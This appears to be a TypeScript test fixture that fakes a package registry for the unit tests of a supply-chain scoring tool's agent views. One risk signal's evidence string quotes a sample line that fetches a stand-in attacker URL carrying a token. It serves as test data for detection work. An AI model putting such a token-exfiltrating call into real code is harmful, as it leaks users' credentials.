// A stand-in registry for the agent views' unit tests: real answer shapes, held in memory.
import type { ExcerptAnswer } from "../file-excerpt";
import type { Fetched, PackageInfo, Signal } from "../registry";
import type { ReviewAnswer } from "../review-schema";
import type { SearchAnswer } from "../search-schema";
import type { AgentSource, NameReport, ResolveOutcome, VersionInfo } from "./source";

export const signal = (s: Partial<Signal> & Pick<Signal, "id" | "label" | "points">): Signal => ({ evidence: [], confidence: "confirmed", ...s });

export const NETWORK = signal({ id: "network", label: "Uses the network: fetch, http, sockets", points: -10, evidence: ["lib/index.js:12: fetch(`https://evil.example/${token}`)"] });

export const INSTALL = signal({ id: "install-script", label: "Runs a script at install time (postinstall)", points: -15, evidence: ["package.json scripts.postinstall: node setup.js"] });

export function pkg(over: Partial<PackageInfo> = {}): PackageInfo {
  return {
    name: "left-pad",
    source: "upstream",
    description: "String left pad",
    readme: "",
    readmeVersion: null,
    repository: null,
    homepage: null,
    bugs: null,
    distTags: { latest: "1.3.0" },
    maintainers: ["stevemao"],
    latest: "1.3.0",
    facts: { moduleFormat: "cjs", types: "none", installScripts: false, hasBin: false, license: "WTFPL", fileCount: 4, unpackedSize: 2048, dependencyCount: 0 },
    score: { score: 75, grade: "B", signals: [NETWORK], notChecked: ["what the code does at runtime", "dependency foo@1 (could not score)"], scorer: "apm-score-v9", digest: "sha512-abc", dismissed: [], redacted: false, capabilities: [] },
    versions: [
      { version: "1.3.0", publishedAt: "2026-01-01T00:00:00.000Z", publishedBy: "stevemao", status: "active", statusReason: null, deprecated: null, score: 75, grade: "B" },
      { version: "1.2.0", publishedAt: "2025-01-01T00:00:00.000Z", publishedBy: "stevemao", status: "yanked", statusReason: "broken build", deprecated: null, score: 90, grade: "A" },
    ],
    ...over,
  };
}

export const REVIEW_CLEAN: ReviewAnswer = {
  name: "left-pad",
  version: "1.3.0",
  status: "reviewed",
  review: { state: "found-nothing", model: "test-model", reviewedAt: "2026-01-02T00:00:00.000Z", coverage: { mode: "files", previousVersion: null, filesInScope: 2, filesRead: 2 }, read: ["index.js"], notRead: [], findings: [], decidedAt: null, note: null },
  redacted: false,
  viewer: "public",
  private: null,
  canRequest: false,
};

export type Fake = Partial<{
  packages: Record<string, PackageInfo>;
  /** Answers of the versions route, by name@version; a version not here falls back to the package answer's list. */
  versions: Record<string, VersionInfo>;
  reviews: Record<string, ReviewAnswer>;
  resolve: (name: string, range: string) => ResolveOutcome;
  search: SearchAnswer | null;
  names: NameReport | null;
  excerpt: Fetched<ExcerptAnswer>;
  down: boolean;
}>;

/** An AgentSource over in-memory answers; `calls` records what was asked, in order. */
export function fakeSource(f: Fake = {}): AgentSource & { calls: string[] } {
  const calls: string[] = [];
  const down = { kind: "unavailable", reason: { kind: "timeout" } } as const;

  return {
    calls,
    async package(name) {
      calls.push(`package ${name}`);

      if (f.down) return down;
      const p = f.packages?.[name];

      return p ? { kind: "ok", value: p } : { kind: "missing" };
    },
    async version({ name, version }) {
      calls.push(`version ${name}@${version}`);

      if (f.down) return down;
      const v = f.versions?.[`${name}@${version}`];

      if (v) return { kind: "ok", value: v };
      // like the registry: latest's facts and score are the package answer's; any other version must be given above
      const p = f.packages?.[name];
      const listed = p?.versions.find((x) => x.version === version);

      if (!p || !listed) return { kind: "missing" };

      return { kind: "ok", value: { version, status: listed.status, statusReason: listed.statusReason, deprecated: listed.deprecated, facts: version === p.latest ? p.facts : null, score: version === p.latest ? p.score : null } };
    },
    async review({ name, version }) {
      calls.push(`review ${name}@${version}`);
      const r = f.reviews?.[`${name}@${version}`];

      return r ? { kind: "ok", value: r } : { kind: "missing" };
    },
    async resolve({ name, range }) {
      calls.push(`resolve ${name}@${range}`);

      return f.resolve ? f.resolve(name, range) : { kind: "missing", reason: `No package named ${name}.` };
    },
    async search({ query }) {
      calls.push(`search ${query}`);

      return f.search ?? null;
    },
    async names({ name, scope }) {
      calls.push(`names ${name} ${scope ?? "-"}`);

      return f.names ?? null;
    },
    async excerpt(input) {
      calls.push(`excerpt ${input.name}@${input.version} ${input.path}:${input.line}±${input.context}`);

      return f.excerpt ?? { kind: "missing" };
    },
  };
}
